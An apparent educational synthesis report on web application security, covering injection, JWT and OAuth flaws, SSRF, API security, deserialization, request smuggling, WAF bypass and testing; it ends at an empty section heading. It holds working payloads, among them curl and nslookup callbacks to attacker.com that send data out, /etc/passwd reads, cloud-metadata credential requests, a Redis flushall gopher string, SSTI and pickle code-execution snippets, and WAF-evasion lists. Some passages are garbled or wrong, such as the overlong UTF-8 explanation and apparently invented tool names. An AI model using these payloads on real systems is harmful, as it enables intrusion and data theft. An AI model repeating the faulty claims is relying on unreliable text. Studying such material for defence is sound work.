# Web Application Security: Final Synthesis Report

> A comprehensive synthesis of the Web Application Security research track — covering architecture, OWASP, injection, authentication, SSRF, API security, client-side exploitation, deserialization, exploitation chains, WAF bypass, testing methodology, hardening, and future trends. Cross-references to the Chromium, Zero-Day, Cloud Security, and Cryptography tracks link web vulnerabilities to their deeper systems-level roots.

---

## Executive Summary

Web application security remains the most consequential domain in information security. The attack surface exposed by HTTP-based applications — serving billions of users across financial, healthcare, government, and infrastructure sectors — has grown in both breadth and depth. Modern web applications are no longer simple document servers. They are distributed systems composed of microservices, API gateways, identity providers, object stores, message queues, and container orchestration layers, all communicating over HTTP/2, gRPC, and WebSocket protocols. Each layer introduces trust boundaries that attackers systematically probe.

This report synthesizes the full Web Application Security track, drawing on analysis of over 200 CVEs, dozens of published exploit chains, and the operational experience of bug bounty hunters, red teamers, and defensive engineers. The central findings are:

1. **Injection is eternal.** SQL injection, cross-site scripting, command injection, and their variants have persisted for over two decades. OWASP's Top 10 has listed injection as the #1 or #2 risk in every edition since 2010. Despite parameterized queries, CSP headers, and input validation frameworks, injection vulnerabilities continue to appear in production systems — partly because legacy codebases persist, and partly because new abstractions (GraphQL, ORM raw queries, template engines) re-introduce injection surfaces.

2. **Authentication and session management failures are systemic.** From credential stuffing at scale (affecting 1–4% of accounts in typical breaches) to JWT algorithm confusion attacks to OAuth redirect-uri validation bypasses, identity-layer vulnerabilities remain a primary pivot point. Multi-factor authentication bypasses — via SIM swapping, push-notification fatigue, or race conditions in verification endpoints — are increasingly common in targeted attacks.

3. **SSRF has become the cloud-era's most impactful vulnerability class.** The shift to cloud-native infrastructure has transformed Server-Side Request Forgery from an information-disclosure curiosity into a critical-severity primitive. AWS, GCP, and Azure metadata endpoints expose temporary credentials, IAM roles, and storage keys to any request reaching `169.254.169.254`. The Capital One breach (2019), the Capital One-style SSRF-to-S3 pattern, and repeated bug bounty findings confirm that SSRF is the new RCE for cloud environments.

4. **API security is the emerging battlefield.** REST, GraphQL, gRPC, and WebSocket APIs expose business logic directly to automated attack. Broken object-level authorization (BOLA/IDOR), mass assignment, and excessive data exposure account for the majority of API-layer findings. The OWASP API Security Top 10 (2019, 2023) codified these patterns, but API gateways frequently lack rate limiting, schema validation, and authentication consistency.

5. **Deserialization gadget chains remain lethal in enterprise Java.** The Java deserialization crisis of 2015 (`Apache Commons Collections`, `Spring`, `JBoss`) demonstrated that gadget chain exploitation scales across libraries, not just individual applications. While Java has adopted `ObjectInputFilter` and preferred JSON serialization, the enterprise Java ecosystem still runs vulnerable library versions, and PHP/Python/.NET deserialization surface areas are underappreciated.

6. **Exploitation chains define real-world impact.** No single vulnerability exists in isolation. The most impactful attacks chain multiple low-to-medium severity findings: open redirect → OAuth token theft, SSRF → metadata credential theft → S3 bucket access, XSS → CSRF bypass → admin action injection. Understanding how vulnerabilities compose into chains is more operationally relevant than understanding any single class in isolation.

7. **WAF bypass is a mature adversarial discipline.** Cloud WAFs (AWS WAF, Cloudflare, Akamai, Imperva) effectively block naive payloads, but determined attackers routinely bypass them through encoding tricks (`%e6%80%a7` overlong UTF-8 for `性` SQL injection), HTTP parameter pollution, chunked transfer encoding, and JSON/XML parsing differential. WAFs are a speed bump, not a wall.

8. **Client-side security is fundamentally constrained.** Content Security Policy, Subresource Integrity, Trusted Types, and CORS provide defense-in-depth, but the browser's same-origin policy remains the load-bearing wall, and it is under increasing strain from Spectre-class side channels (see [Chromium track](../Chromium_Architecture_and_Vulnerability/)), postMessage handlers, and the growing complexity of client-side JavaScript frameworks.

9. **HTTP Request Smuggling is a resurgence-class vulnerability.** The 2019 revival by James Kettle demonstrated that discrepancies between frontend and backend HTTP parsers — in `Content-Length` vs `Transfer-Encoding: chunked` interpretation — enable request queue poisoning, authentication bypass, and cache poisoning at scale. Every reverse proxy + application server combination is a potential smuggling surface.

10. **The future is concurrent attack surfaces.** WebAssembly runtime bugs, WebSocket state machine flaws, gRPC protobuf injection, and supply-chain compromise of npm/PyPI dependencies are expanding the attack surface faster than defensive frameworks can adapt.

---

## 1. Web Application Architecture as an Attack Surface

### 1.1 The Modern Web Stack

A contemporary web application is a multi-tier distributed system. Understanding its architecture is prerequisite to understanding its vulnerabilities:

```
Client (Browser)
  ├── JavaScript Framework (React/Vue/Angular/Svelte)
  ├── Service Worker / PWA
  └── WebAssembly modules
      │
      ▼
CDN / Edge (Cloudflare, Akamai, AWS CloudFront)
  ├── WAF rules
  ├── Rate limiting
  └── Cache layer
      │
      ▼
Load Balancer / Reverse Proxy (nginx, HAProxy, Envoy, ALB)
  ├── TLS termination
  ├── HTTP/2 → HTTP/1.1 translation
  └── Request routing
      │
      ▼
API Gateway (Kong, AWS API Gateway, Ambassador)
  ├── Authentication (JWT, OAuth2)
  ├── Rate limiting (per-endpoint)
  └── Request transformation
      │
      ▼
Application Tier (microservices)
  ├── Web framework (Django, Flask, Express, Spring Boot, Rails, ASP.NET)
  ├── ORM (SQLAlchemy, Hibernate, Prisma, Entity Framework)
  ├── Template engine (Jinja2, Thymeleaf, EJS, Blade)
  └── Message queue producer (Kafka, RabbitMQ, SQS)
      │
      ▼
Data Tier
  ├── Relational DB (PostgreSQL, MySQL, SQL Server)
  ├── Document DB (MongoDB, DynamoDB)
  ├── Cache (Redis, Memcached)
  ├── Object Storage (S3, GCS, Azure Blob)
  └── Search (Elasticsearch, OpenSearch)
```

Every arrow in this diagram is a trust boundary. Every component introduces parsing, state management, and serialization logic that can be subverted.

### 1.2 Trust Boundaries and Data Flow

The fundamental security problem in web applications is that data crosses trust boundaries without sufficient validation. The browser is untrusted. The CDN is semi-trusted (shared infrastructure). The reverse proxy parses the same HTTP request differently from the application server. The ORM translates application-level queries into SQL but can be bypassed with raw queries. The template engine renders user-controlled data into HTML, XML, or LaTeX.

Each of these boundaries is a potential injection point. The [Chromium track](../Chromium_Architecture_and_Vulnerability/) documents how the browser's process isolation model creates a trust boundary between renderer and browser process — and how Mojo IPC validation failures across that boundary lead to sandbox escapes. The same principle applies at every layer of the web stack: data that crossed one trust boundary unscathed may be toxic at the next.

### 1.3 The Same-Origin Policy and Its Erosion

The Same-Origin Policy (SOP) is the browser's primary security boundary. An origin is defined as the tuple `(scheme, host, port)`. SOP prevents documents from one origin from reading responses from another origin. It does not prevent writing — which is why CSRF is possible.

Cross-Origin Resource Sharing (CORS) relaxes SOP for legitimate cross-origin requests. Misconfigured CORS (`Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`, or dynamic origin reflection) effectively subverts SOP entirely.

The proliferation of subdomains, API gateways, and third-party integrations has made origin boundaries increasingly porous. PostMessage handlers, WebSocket connections, and `document.domain` relaxation further erode the boundary. The Spectre class of side-channel attacks (documented in the [Chromium track](../Chromium_Architecture_and_Vulnerability/)) demonstrated that even a correctly enforced SOP is insufficient when microarchitectural data leaks across the origin boundary.

---

## 2. Injection: The Eternal Vulnerability Class

### 2.1 SQL Injection

SQL injection has been known since at least 1998 (Rain Forest Puppy's RFPoison), and it remains in OWASP Top 10 #1 (2013, 2017) and #3 (2021). The vulnerability arises when user input is concatenated into SQL queries without parameterization.

**Variants:**
- **In-band (classic):** Union-based (`' UNION SELECT username,password FROM users--`), error-based (`' AND extractvalue(1,concat(0x7e,version()))--`)
- **Blind:** Boolean-based (`' AND substring(version(),1,1)=5--`), time-based (`' AND sleep(5)--`)
- **Out-of-band:** DNS exfiltration (`' UNION SELECT load_file(concat('\\\\\\\\',version(),'.attacker.com\\\\a'))--`)

**Modern bypass techniques:**
- WAF evasion via overlong UTF-8 (`%e6%80%a7` → `性` → `性` contains `性` in GBK but `性` in UTF-8; if the WAF and backend use different encodings, the WAF sees gibberish while the backend decodes a valid query)
- HTTP Parameter Pollution: `id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users` — WAF parses the first `id`, backend parses the last
- JSON injection: `{"username":"admin'--","password":"x"}` when the application builds queries from JSON fields
- HQL/JPQL injection in ORM frameworks: Hibernate's HQL supports `from` without `select`, enabling `from User where username='admin' or '1'='1'`

**Mitigation:** Parameterized queries (prepared statements) eliminate the entire class. ORM frameworks that use parameterized queries internally (SQLAlchemy, Hibernate, Prisma) are safe by default but can be bypassed through raw query execution (`session.execute()`, `entityManager.createNativeQuery()`).

### 2.2 Cross-Site Scripting (XSS)

XSS exploits the browser's HTML parser to inject JavaScript that executes in the victim's origin. The three canonical categories are:

**Reflected XSS:** User input is reflected in the response without encoding. Common in search results, error messages, and URL parameters. Requires social engineering (phishing) to deliver the payload.

**Stored XSS:** Malicious input is stored on the server (in a database, log, or file) and served to all users who view the affected page. No social engineering required. This is the most impactful variant — it affected Twitter (2010, the `onmouseover` worm), WordPress comments, and virtually every forum platform.

**DOM-based XSS:** The vulnerability exists entirely in client-side JavaScript. `document.write(userInput)`, `innerHTML = location.hash`, and `eval(userInput)` are classic sinks. Modern frameworks have reduced DOM XSS but introduced new sinks: React's `dangerouslySetInnerHTML`, Angular's `DomSanitizer.bypassSecurityTrustHtml()`, and Vue's `v-html`.

**CSP bypass techniques:**
- `script-src 'unsafe-inline'` — present in 94% of CSP deployments that use CSP (PortSwigger 2021 survey)
- JSONP endpoints as script sources: `script-src *` allows `https://cdn.jsdelivr.net/...` but also `https://accounts.google.com/o/oauth2/revoke?callback=alert(1)//`
- Base tag injection to redirect script loads
- `script-src 'nonce-xxx'` bypassed via `script-src-attr` or `trusted-types` misconfiguration
- `default-src 'self'` bypassed via SVG `onload`, `<body onload>`, or `<img src=x onerror>`

**DOM Clobbering:** Injecting HTML elements that shadow JavaScript variables. `<form id=location>` shadows `window.location`. `<img name=globalConfig>` shadows `window.globalConfig`. This can redirect execution flow without script execution, bypassing CSP entirely.

### 2.3 Command Injection

When user input reaches OS command execution (`system()`, `exec()`, `Runtime.exec()`, `subprocess.call()`), the attacker can inject shell metacharacters (`;`, `|`, `&&`, `||`, backticks, `$()`).

```
# CVE-2024-... (typical pattern)
url = request.GET['url']
os.system(f"curl {url}")
# Attacker: ?url=http://x;cat /etc/passwd
```

**Blind command injection** uses time delays (`;sleep 5`), DNS callbacks (`;nslookup attacker.com`), or HTTP callbacks (`;curl http://attacker.com/$(whoami)`) for confirmation.

### 2.4 Template Injection (SSTI)

Server-Side Template Injection occurs when user input is placed directly into a template expression. Jinja2's `{{config}}`, Twig's `{{_self.env.registerGlobals}}, and Freemarker's `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` all demonstrate that template engines are typically Turing-complete and provide direct access to the host OS.

The Jinja2 Sandbox bypass chain is illustrative:
```python
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[406]('id',shell=True,stdout=-1).communicate() }}
```

---

## 3. Authentication and Session Management

### 3.1 Authentication Failure Patterns

OWASP A07:2021 (Identification and Authentication Failures) encompasses:

- **Credential stuffing:** Automated injection of breached username/password pairs. Tools like `sniperprince`, custom scripts, and credential-stuffing-as-a-service platforms test billions of combinations. Rate limiting and CAPTCHA mitigate but do not eliminate the threat.
- **Brute force:** Unthrottled authentication endpoints. PCI DSS requires account lockout after 6 failed attempts, but many APIs lack any rate limiting.
- **Weak password policies:** Allowing `password123`, lacking minimum entropy requirements, not checking against breached password databases (Have I Been Pwned).
- **Missing multi-factor authentication:** The single most impactful defensive measure. NIST SP 800-63B recommends FIDO2/WebAuthn as the gold standard.

### 3.2 JWT Attacks

JSON Web Tokens are widely deployed for stateless authentication. Common attacks:

**Algorithm confusion (CVE-2016-5431 pattern):** Change the header `alg` from `RS256` to `HS256`. The server's public key becomes the HMAC shared secret. The attacker signs with the public key (which is often publicly accessible via `/.well-known/jwks.json`) and the server validates successfully.

```json
// Modified header
{"alg": "HS256", "typ": "JWT"}
// Server verifies using RSA public key as HMAC secret → valid signature
```

**None algorithm:** Set `alg` to `none` and remove the signature. Some libraries accept this. `eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.`

**Weak secret:** JWTs signed with `HS256`/`HS384`/`HS512` are vulnerable to offline brute force. Secretswrapper and `jwt-cracker` can test millions of secrets per second with GPU acceleration. Common weak secrets: `secret`, `password`, the application name, `<company>_jwt_secret`.

**JWK/JWKs injection:** The `jwk` header parameter allows embedding a public key. If the server trusts the embedded key without verifying it against a known whitelist, the attacker can sign with their own keypair.

**Claim manipulation:** `kid` (Key ID) header parameter can be vulnerable to SQL injection or path traversal: `{"kid":"../../dev/null","alg":"HS256"}` → the secret becomes an empty string.

### 3.3 OAuth 2.0 and OIDC Vulnerabilities

OAuth 2.0 is the de facto standard for delegated authorization. OpenID Connect (OIDC) adds an identity layer. Common vulnerability patterns:

- **Redirect URI validation bypass:** The `redirect_uri` parameter tells the authorization server where to send the authorization code. If the server allows open redirects or partial matches (`redirect_uri` starts with the registered URI), an attacker can redirect the code to their server. Stripe (2019), GitHub, and numerous OAuth implementations have suffered this.
- **CSRF in OAuth (`state` parameter omission):** The `state` parameter prevents CSRF attacks. If absent, an attacker can bind their own account to the victim's third-party identity.
- **Authorization code leakage:** Codes in `Referer` headers, browser history, or logs. PKCE (Proof Key for Code Exchange) mitigates code interception.
- **Token storage in `localStorage`:** Access tokens stored in `localStorage` are accessible to any XSS in the origin. `HttpOnly` cookies with `SameSite=Strict` are preferred.
- **Scope escalation:** Requesting higher-privileged scopes than granted by the resource owner.

---

## 4. Server-Side Request Forgery (SSRF)

### 4.1 SSRF in the Cloud Era

SSRF has undergone a severity escalation driven by cloud infrastructure. In a traditional data center, SSRF might expose internal network topology. In AWS/GCP/Azure, SSRF delivers cloud metadata credentials:

```bash
# AWS IMDSv1
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns: S3AccessRole
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/S3AccessRole
# Returns: {AccessKeyId, SecretAccessKey, Token, Expiration}

# GCP
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
# Returns: service accounts, tokens, project info

# Azure
curl -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

The Capital One breach (2019) followed this exact pattern: SSRF in a WAF-modified EC2 instance → metadata endpoint → IAM role credentials → S3 bucket access → 100M+ customer records.

### 4.2 SSRF Bypass Techniques

```bash
# IP address bypasses
127.0.0.1          → localhost
0x7f000001         → hex encoding of 127.0.0.1
0177.0.0.1         → octal
2130706433         → decimal
127.1              → shortened
0                  → short for 0.0.0.0

# DNS rebinding
1.attacker.com → 127.0.0.1 (first resolution)
1.attacker.com → 192.168.1.1 (second resolution, after SSRF check passes)

# Open redirect via URL parser differences
http://victim.com/@attacker.com
http://victim.com/redirect?url=http://internal/

# Protocol smuggling
gopher://internal-host:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a  (Redis)
dict://internal-host:6379/info  (Redis INFO)
```

### 4.3 SSRF to RCE Chains

SSRF frequently chains into RCE:

1. **SSRF → Redis → RCE:** Access Redis on the internal network, write SSH authorized_keys or cron tasks
2. **SSRF → Cloud metadata → IAM credentials → S3/Admin API:** Full cloud account takeover
3. **SSRF → Internal admin panel → RCE:** Unauthenticated internal admin tools
4. **SSRF → Kubernetes API → pod creation:** `https://kubernetes.default.svc/api/v1/namespaces/default/pods`

See the [Cloud Security track](../cloud_security/) for cloud-specific attack paths.

---

## 5. API Security

### 5.1 Broken Object-Level Authorization (BOLA/IDOR)

BOLA — the #1 item in the OWASP API Security Top 10 (2019 and 2023) — occurs when an API endpoint exposes object references without verifying the caller's authorization:

```http
GET /api/users/1234/profile HTTP/1.1
Authorization: Bearer <token for user 5678>
```

If the server returns user 1234's data without checking that the token belongs to user 1234, this is BOLA. It is the most common API vulnerability in bug bounty programs, accounting for 30–40% of critical findings on platforms like HackerOne and Bugcrowd.

**Defense:** Mandatory authorization checks at the API gateway or application layer. Every object access must be verified against the caller's identity. UUIDs provide defense through obscurity (harder to guess than sequential integers) but are not a substitute for authorization.

### 5.2 Mass Assignment

APIs that directly bind request parameters to ORM models expose internal fields:

```json
POST /api/users
{"username": "newuser", "password": "hashed", "isAdmin": true}
```

If the ORM auto-populates all fields from the request body, an attacker can set `isAdmin`, `role`, `isVerified`, or any other field in the model. This affected Rails (ActiveRecord `attr_accessible`), Spring (`@RequestBody` binding), and numerous custom APIs.

**Defense:** Explicit allow-lists of creatable/updatable fields (DTOs), never bind raw request objects to models.

### 5.3 GraphQL-Specific Vulnerabilities

GraphQL introduces unique attack surfaces:

- **Introspection schema leak:** `__schema` queries expose the entire API graph, including hidden types and fields.
- **Batch/alias-based brute force:** `[{user(id:1){password}}, {user(id:2){password}}, ...]` — bypasses rate limiting per query.
- **Deep query DoS:** Nested queries exponentially increase resolver execution: `{a{b{c{d{...}}}}}` — depth limiting is essential.
- **Field suggestion information disclosure:** Error messages reveal field names: `"Did you mean 'ssn'?"`

### 5.4 gRPC and Protocol Buffers

gRPC uses HTTP/2 and binary protobuf serialization. Attack surfaces include:
- **Protobuf schema extraction:** Even without the `.proto` file, tools like `grpcurl` and `grpcui` can introspect services via gRPC reflection.
- **Message manipulation:** Modifying protobuf binary payloads to set internal/repeated fields.
- **Missing authentication on streaming RPCs:** Server-streaming and bidirectional-streaming RPCs often lack per-message authentication.

---

## 6. Client-Side Security

### 6.1 Content Security Policy (CSP)

CSP is the most important client-side defense against XSS. It specifies which sources are allowed for scripts, styles, images, and other resources. However, adoption remains low, and misconfigurations are endemic:

- `'unsafe-inline'` in `script-src` negates CSP's XSS protection (present in 94% of deployed CSPs).
- `'unsafe-eval'` allows `eval()` and `new Function()`.
- Missing `frame-ancestors` directive leaves the application vulnerable to clickjacking.
- `default-src 'self'` without `object-src 'none'` allows Flash/PDF-based XSS.

**Trusted Types** (Chrome 83+) is the most promising CSP evolution. It requires all DOM sinks (`innerHTML`, `eval`, `document.write`) to receive typed values rather than raw strings, preventing DOM XSS at the type system level:

```javascript
// Without Trusted Types (vulnerable)
element.innerHTML = userInput; // XSS

// With Trusted Types (safe)
const policy = trustedTypes.createPolicy('sanitize', {
  createHTML: (input) => DOMPurify.sanitize(input)
});
element.innerHTML = policy.createHTML(userInput); // Safe
```

### 6.2 Subresource Integrity (SRI) and Supply Chain

SRI allows browsers to verify that fetched resources (JS, CSS) match a known hash:

```html
<script src="https://cdn.example.com/lib.js"
  integrity="sha384-abc123..."
  crossorigin="anonymous"></script>
```

Without SRI, a compromised CDN or package can inject malicious JavaScript into every page that includes the resource. The [supply chain security track](../web_security/) and recent incidents (event-stream malicious insertion, ua-parser-js compromise, various npm typosquatting campaigns) underscore that SRI is essential for third-party CDN resources.

### 6.3 PostMessage and Cross-Origin Communication

`window.postMessage()` is the primary mechanism for cross-origin communication in modern web applications. Vulnerability patterns:

- **Missing origin check:** `event.source` or `event.origin` not validated before processing the message. This allows any origin to send messages.
- **Wildcard target origin:** `targetWindow.postMessage(data, '*')` — leaks data to any origin.
- **Overly permissive origin checks:** `event.origin.startsWith('https://example.com')` matches `https://example.com.evil.com`.

### 6.4 Web Security in the Browser Context

The [Chromium track](../Chromium_Architecture_and_Vulnerability/) documents the browser's internal security architecture — process isolation, site isolation, sandboxing — that underpins all client-side web security. When the browser's security boundary is compromised (e.g., via a V8 type confusion → renderer RCE → sandbox escape), all web security guarantees are void. This is why browser exploit chains are so valuable: they bypass SOP, CSP, CORS, and every other origin-enforced boundary.

---

## 7. Deserialization Vulnerabilities

### 7.1 Java Deserialization (The Catastrophe)

The 2015 Java deserialization crisis began with the Foxglove Security research demonstrating that Apache Commons Collections gadget chains could achieve RCE on WebLogic, WebSphere, JBoss, Jenkins, and GlassFish. The core mechanism:

```java
// Gadget chain: InvokerTransformer → ConstantTransformer → Runtime.exec()
ObjectInputStream ois = new ObjectInputStream(input);
ois.readObject(); // Deserializes attacker-controlled byte stream
// Chain: ChainedTransformer → InvokerTransformer("exec", ..., "calc.exe")
```

The gadget chain library landscape:
- **Apache Commons Collections 3.x/4.x** — `InvokerTransformer`, `InstantiateTransformer`, `ClosureTransformer`
- **Spring** — `ObjectFactoryDelegatingInvocationHandler`
- **Jackson** — `@JsonTypeInfo(use=Id.CLASS)` with polymorphic deserialization
- **XStream** — ProcessConexion, ImageIO gadget chains
- **Commons BeanUtils** — `BeanComparator` + `TemplatesImpl`

**Mitigation:** `ObjectInputFilter` (Java 9+), avoid `readObject()` for untrusted data, use JSON serialization, network-layer filtering of `java.lang.Serializable` classes.

### 7.2 PHP Deserialization

PHP's `unserialize()` function instantiates objects and calls magic methods (`__wakeup`, `__destruct`, `__toString`) with attacker-controlled properties. Common gadget chains:

- **Laravel (<8.4.0):** `PendingBroadcast` → `Dispatcher` → `BroadcastDispatcher` → command execution
- **WordPress:** Multiple plugin gadget chains (`__destruct` in various classes)
- **Yii2:** `BatchQueryResult.__destruct()` → `unserialize()` chain
- **Magento:** `Credis_Client` → Redis command injection via `__destruct`

```php
// PHP deserialization payload structure
O:8:"ClassName":1:{s:3:"cmd";s:6:"id;ls";}
```

**Phar deserialization:** `phar://` wrapper triggers `unserialize()` on the phar metadata, enabling deserialization even when the user-controlled input is a filename, not a serialized string. This affects `file_exists()`, `is_file()`, `fopen()`, and dozens of other filesystem functions.

### 7.3 Python Deserialization

Python's `pickle` module executes arbitrary Python code during deserialization:

```python
import pickle, os
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))
payload = pickle.dumps(Exploit())
```

**YAML deserialization:** PyYAML's `yaml.load()` (without `Loader=yaml.SafeLoader`) executes Python code via `!!python/object/apply:` tags. `yaml.safe_load()` restricts to safe types.

### 7.4 .NET Deserialization

.NET deserialization attacks target `BinaryFormatter`, `SoapFormatter`, `LosFormatter`, and `ObjectStateFormatter`. YSoSerial.NET provides gadget chains for:

- **ViewState:** ASP.NET ViewState uses `LosFormatter` with MAC validation. If `enableViewStateMac=false` or the MAC key is known (via web.config disclosure), ViewState injection achieves RCE.
- **JSON.NET:** `TypeNameHandling.Objects` or `TypeNameHandling.Auto` enables type-aware deserialization that can instantiate arbitrary types.
- **Common gadget chains:** `ActivitySurrogateSelector`, `ObjectDataProvider`, `WindowsIdentity`, `PSObject`

---

## 8. HTTP Request Smuggling

### 8.1 The Core Mechanism

HTTP Request Smuggling exploits discrepancies between how frontend (proxy/load balancer) and backend servers parse the HTTP `Content-Length` and `Transfer-Encoding` headers:

```
Content-Length: 13
Transfer-Encoding: chunked

0\r\n
\r\n
SMUGGLED
```

If the frontend processes `Transfer-Encoding: chunked` and the backend processes `Content-Length: 13`, the frontend sends the entire request (including `SMUGGLED`), while the backend sees `0\r\n\r\n` as the complete request and treats `SMUGGLED` as the beginning of the next request.

**CL-TE:** Frontend uses Content-Length, backend uses Transfer-Encoding. The frontend sends the full request; the backend sees the smuggled content as a new request.

**TE-CL:** Frontend uses Transfer-Encoding, backend uses Content-Length. The frontend sends the chunked request; the backend includes part of the next request in the current response.

**TE-TE:** Both process Transfer-Encoding, but one can be confused by obfuscation (`Transfer-Encoding: chunked\r\n Transfer-Encoding: something`).

### 8.2 Impact

- **Authentication bypass:** Smuggle a request with admin headers prepended to a victim's request.
- **Cache poisoning:** Smuggle a request that poisons CDN cache entries, serving malicious content to all users.
- **Cache deception:** Smuggle a request where the CDN caches a response that should not be cached (e.g., `/profile.css` returning the user's profile data).
- **Web cache deception:** Exploit path normalization differences to exfiltrate authenticated content.

### 8.3 Real-World Smuggling

CVE-2019-11043 (PHP-FPM + nginx path normalization), the 2019 PayPal authentication bypass (CL-TE), and repeated findings across AWS ALB, Cloudflare, and Akamai demonstrate that smuggling remains pervasive. The [zero_day track](../zero_day/) covers discovery methodology (diffing parser behavior), while the web security track provides the HTTP-specific exploitation patterns.

---

## 9. Exploitation Chains

### 9.1 Chain Composition

No vulnerability exists in isolation. The most impactful attacks chain multiple findings:

**Open Redirect → OAuth Token Theft:**
```
https://auth.example.com/authorize?redirect_uri=https://app.example.com/callback?redirect=https://evil.com
→ User authenticates → redirect_uri honored → code/token sent to evil.com via Referer
```

**SSRF → Cloud Metadata → Account Takeover:**
```
SSRF in image processor → http://169.254.169.254/latest/meta-data/iam/security-credentials/Role
→ AWS credentials → aws s3 ls s3://company-production/ → data exfiltration
```

**XSS → CSRF Bypass → Admin Action:**
```
Stored XSS on forum → admin views page → XSS sends POST /admin/users/create with admin session
→ new admin account created → full application takeover
```

**Deserialization → RCE → Internal Network Pivot:**
```
Java deserialization in web endpoint → RCE on application server → SSRF to cloud metadata
→ IAM credentials → full cloud account compromise
```

### 9.2 The Anatomy of a Full Chain

The PayPal request smuggling (2019, James Kettle) illustrates how a single parsing discrepancy compounds:

1. Frontend (HAProxy) and backend (PHP-FPM) disagree on request boundaries (CL-TE discrepancy).
2. Smuggled request prepends `GET /admin/users HTTP/1.1` to the victim's next request.
3. Backend processes the combined request as the victim's authenticated session accessing `/admin/users`.
4. Attacker obtains admin user list.

Each step is a low-to-medium finding in isolation. The composition yields critical impact.

---

## 10. WAF Bypass Techniques

### 10.1 Encoding and Obfuscation

```
# SQLi WAF bypass
SEL%45CT * FR%4FM users         -- URL encoding of E and O
%53%45%4c%45%43%54              -- Full URL encoding
%u0053ELECT                     -- Unicode encoding
0x53454c454354                   -- Hex string (MySQL)
/**/SELECT/**/*/**/FROM/**/     -- Comment injection
sElEcT * FrOm users             -- Mixed case

# XSS WAF bypass
<img src=x onerror=alert(1)>                        -- Basic
<img src=x one_s_r_c=alert(1)>                       -- Underscore insertion (IIS)
<svg/onload=alert(1)>                                -- Tag without space
<script>alert(1)</script>                      -- HTML entity encoding
<iframe src="javascript:alert(1)">                   -- Protocol handler
%3Cscript%3Ealert(1)%3C/script%3E                    -- URL encoding (double decode)
<scr\x00ipt>alert(1)</script>                        -- Null byte injection
<object data="javascript:alert(1)">                  -- Alternative tags

# Command injection WAF bypass
c''at /etc/passwd          -- Empty string concatenation (bash)
c${IFS}at /etc/passwd     -- Internal Field Separator
c%61t /etc/passwd          -- URL encoding inside parameter value
cat${PATH:0:1}etc${PATH:0:1}passwd  -- PATH variable abuse
```

### 10.2 HTTP-Level Bypass

- **Chunked transfer encoding:** WAF may not reassemble chunked bodies before inspection.
- **HTTP/2 multiplexing:** WAF may not fully parse HTTP/2 frames.
- **Request splitting:** `\r\n` in header values to create additional headers invisible to WAF.
- **Content-Type confusion:** Sending `Content-Type: application/json` with a body that the backend parses as `application/x-www-form-urlencoded`.
- **Double URL encoding:** `%2527` → `%27` → `'` after double decode by the backend.
- **Parameter pollution:** `id=1&id=UNION SELECT ...` — WAF sees `id=1`, backend sees `UNION SELECT`.

### 10.3 The WAF Is Not the Wall

WAFs provide defense-in-depth against automated scanners and script kiddies. They do not stop determined attackers. The correct posture is: WAF as a monitoring and alerting tool, not as the primary defense. Input validation, output encoding, parameterized queries, and CSP provide the primary defense.

---

## 11. Web Security Testing Methodology

### 11.1 Reconnaissance

```
# Subdomain enumeration
subfinder -d target.com -silent | httpx -status-code -title
amass enum -d target.com

# Technology identification
whatweb https://target.com
wappalyzer (browser extension)

# Content discovery
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
gobuster dir -u https://target.com -w common.txt

# API discovery
# OpenAPI/Swagger
/.well-known/openapi.json, /swagger.json, /api-docs, /graphql
# GraphQL introspection
{__schema{types{name,fields{name}}}}

# JavaScript analysis
# Extract endpoints, API keys, secrets from bundled JS
curl -s https://target.com/main.js | grep -oP 'https?://[^"]+'
curl -s https://target.com/main.js | grep -oP '["\x27][A-Za-z0-9_\-/]+["\x27]' | sort -u
```

### 11.2 Automated Scanning

- **DAST:** OWASP ZAP, Burp Suite scanner — black-box testing against running application
- **SAST:** Semgrep, CodeQL — static analysis of source code
- **SCA:** Snyk, Dependabot, OWASP Dependency-Check — identify vulnerable dependencies
- **DAST API:** OWASP ZAP API scan, Postman + Burp, dedicated GraphQL scanners

### 11.3 Manual Testing Methodology

Systematic testing of each vulnerability class against each input vector:

1. Map all input vectors: URL parameters, POST body, HTTP headers (including `X-Forwarded-*`, cookies, `Content-Type`, `Accept`)
2. Test injection (SQLi, XSS, SSTI, command injection) at each vector
3. Test authentication and authorization (BOLA, privilege escalation, JWT manipulation)
4. Test business logic (state machine violations, race conditions, TOCTOU)
5. Test client-side security (CSP, CORS, postMessage, cookie flags)
6. Test API-specific patterns (rate limiting, mass assignment, excessive data exposure)
7. Test for SSRF and request smuggling
8. Test deserialization for each framework
9. Test file upload (extension bypass, content-type mismatch, path traversal in filename, polyglot files)
10. Test for information disclosure (error messages, stack traces, version headers, debug endpoints)

---

## 12. Hardening

### 12.1 Application Layer

- **Input validation:** Whitelist approach, validate type/length/range, never blacklists
- **Output encoding:** Context-aware encoding (HTML body, HTML attribute, JavaScript, CSS, URL)
- **Parameterized queries:** All database access uses prepared statements
- **CSP:** Strict CSP with nonce-based `script-src`, `object-src 'none'`, `base-uri 'self'`
- **Trusted Types:** Enforce via CSP `require-trusted-types-for 'script'`
- **Authentication:** Multi-factor (FIDO2/WebAuthn preferred), account lockout, breached password checks
- **Session management:** `HttpOnly`, `Secure`, `SameSite=Strict` cookies; short session lifetimes; regenerate session ID on login
- **Headers:** `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: no-referrer`, `Permissions-Policy`, `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`

### 12.2 Infrastructure Layer

- **TLS:** TLS 1.3 minimum, HSTS preload, certificate pinning for critical services
- **WAF:** Deploy for monitoring and alerting, not as primary defense
- **Rate limiting:** Per-user, per-endpoint, with graduated responses (429 → 403 → temporal block)
- **Network segmentation:** Application servers on private subnets, metadata endpoints blocked at the firewall
- **Least privilege:** IAM roles with minimum required permissions, no wildcard actions
- **Logging and monitoring:** Centralized logging (SIEM), anomaly detection on authentication events, WAF alert correlation

### 12.3 Container and Kubernetes

